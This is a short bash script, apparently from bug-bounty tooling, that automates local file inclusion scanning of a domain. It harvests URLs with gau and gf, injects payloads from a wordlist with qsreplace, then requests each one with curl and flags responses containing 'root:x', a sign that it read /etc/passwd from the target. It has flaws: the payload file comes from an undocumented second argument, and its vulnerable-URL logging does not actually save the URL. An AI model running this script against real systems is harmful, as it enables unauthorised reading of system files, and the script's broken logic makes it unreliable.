#!/usr/bin/env bash

# Simple automated LFI checker, insipred by https://github.com/dwisiswant0/awesome-oneliner-bugbounty
# bash lfi.sh domain.com

echo "[*] Getting LFI endpoints"
gau -subs $1 | gf lfi | tee -a lfi.txt
for P in $(cat $2); do cat lfi.txt | qsreplace "$P" | tee -a payloads_lfi.txt; done
echo "[*] LFI payloads generated"
echo "[*] Testing for LFI payloads"
for D in $(cat payloads_lfi.txt); do echo "[*] Testing $D"; curl -sk $D | grep -q "root:x" && echo "VULN!" && tee -a vulnerable.txt; done